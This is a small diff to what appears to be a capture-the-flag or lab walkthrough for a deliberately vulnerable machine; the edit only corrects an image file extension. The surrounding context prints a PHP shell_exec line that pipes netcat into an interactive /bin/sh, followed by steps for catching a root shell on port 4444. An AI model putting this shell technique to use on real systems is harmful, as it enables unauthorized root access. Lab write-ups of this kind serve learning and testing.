@@ -82,6 +82,6 @@ $a = shell_exec('nc localhost 4444 0<f | /bin/sh -i 2>&1 | tee -f');
 
 Run 'screen' commnad to have to virtual sessions. Lunch nc to listen on port 4444. Move to second session and run my php file. BAAAM i have root shell :) 
 
-![](/images/vuln_me_girlfriend/root_shell.md)
+![](/images/vuln_me_girlfriend/root_shell.png)
 
 I hope you like this walkthrough
